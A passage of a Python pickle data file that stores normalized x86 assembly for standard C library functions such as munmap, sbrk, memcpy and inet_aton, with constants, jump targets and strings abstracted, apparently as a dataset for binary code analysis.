S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p407
L63L
tp408
a(S'munmap'
p409
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p410
L50L
tp411
a(S'nanosleep'
p412
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p413
L50L
tp414
a(S'sbrk'
p415
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nCMP~<STR>,0\nMOV~ESI,[ESP+0]\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nTEST~ESI,ESI\nMOV~EAX,<STR>\nJNZ~FOO\nMOV~EBX,EAX\nJMP~FOO\nSUB~ESP,0\nMOV~EBX,EAX\nLEA~EAX,[EAX+ESI]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~EBX\nPOP~ESI\nRETN"'
p416
L78L
tp417
a(S'times'
p418
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p419
L46L
tp420
a(S'__xstat_conv'
p421
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nPUSH~0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOVZX~EAX,WORDPTR[ESI]\nMOV~[EBX+0],0\nMOV~[EBX],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p422
L125L
tp423
a(S'memcpy'
p424
S'"PUSH~EDI\nPUSH~ESI\nMOV~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~ECX,EAX\nMOV~EDI,[ESP+0]\nSHR~ECX,0\nMOVSD~,\nTEST~AL,0\nJZ~FOO\nMOVSW~,\nTEST~AL,0\nJZ~FOO\nMOVSB~,\nMOV~EAX,[ESP+0]\nPOP~ESI\nPOP~EDI\nRETN"'
p425
L39L
tp426
a(S'inet_aton'
p427
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nXOR~ESI,ESI\nMOV~DWORDPTR[ESP],0\nJMP~FOO\nMOVSX~EAX,BYTEPTR[ECX]\nMOV~EBP,<STR>\nTEST~[EBP+EAX*2+0],0\nJZ~FOO\nXOR~EDI,EDI\nJMP~FOO\nIMUL~EAX,EDI,0\nLEA~EDI,[EAX+EBX-0]\nCMP~EDI,0\nJG~FOO\nINC~ECX\nMOV~DL,[ECX]\nMOVSX~EBX,DL\nMOVZX~EAX,[EBP+EBX*2+0]\nTEST~AL,0\nJNZ~FOO\nCMP~DWORDPTR[ESP],0\nJG~FOO\nCMP~DL,0\nJNZ~FOO\nINC~ECX\nJMP~FOO\nINC~ECX\nTEST~DL,DL\nJZ~FOO\nTEST~AL,0\nJZ~FOO\nSHL~ESI,0\nINC~DWORDPTR[ESP]\nOR~ESI,EDI\nCMP~DWORDPTR[ESP],0\nJLE~FOO\nMOV~EAX,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nBSWAP~ESI\nMOV~[EAX],ESI\nMOV~EAX,0\nJMP~FOO\nXOR~EAX,EAX\nPOP~EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p428
L148L
tp429
a(S'_dl_aux_init'
p430
S'"MOV~EDX,[EAX+0]\nMOV~<STR>,EDX\nMOV~EAX,[EAX+0]\nMOV~<STR>,EAX\nRETN"'
p431
L18L
tp432
a(S'brk'
p433
S'"PUSH~EBX\nMOV~EDX,0\nSUB~ESP,0\nMOV~EAX,EDX\nMOV~EBX,[ESP+0]\nMOV~ECX,EBX\nMOV~EBX,EBX\nINT~0\nMOV~EBX,ECX\nXOR~ECX,ECX\nMOV~<STR>,EAX\nCMP~EAX,EBX\nJNB~FOO\nCALL~FOO\nOR~ECX,0\nMOV~DWORDPTR[EAX],0\nMOV~EAX,ECX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p434
L54L
tp435
a(S'__syscall_error'
p436
S'"SUB~ESP,0\nMOV~EDX,EAX\nNEG~EDX\nCALL~FOO\nMOV~[EAX],EDX\nOR~EAX,0\nADD~ESP,0\nRETN"'
p437
L21L
tp438
a(S'__do_global_ctors_aux'
p439
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,0\nMOV~EAX,<STR>\nCMP~EAX,0\nJZ~FOO\nSUB~EBX,0\nCALL~EAX\nMOV~EAX,[EBX]\nCMP~EAX,0\nJNZ~FOO\nPOP~EAX\nPOP~EBX\nPOP~EBP\nRETN"'
p440
L38L
tp441
a(S'_fini'
p442
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nCALL~FOO\nADD~EBX,0\nCALL~FOO\nPOP~EBX\nPOP~EBP\nRETN"'
p443
L23L
tp444
a.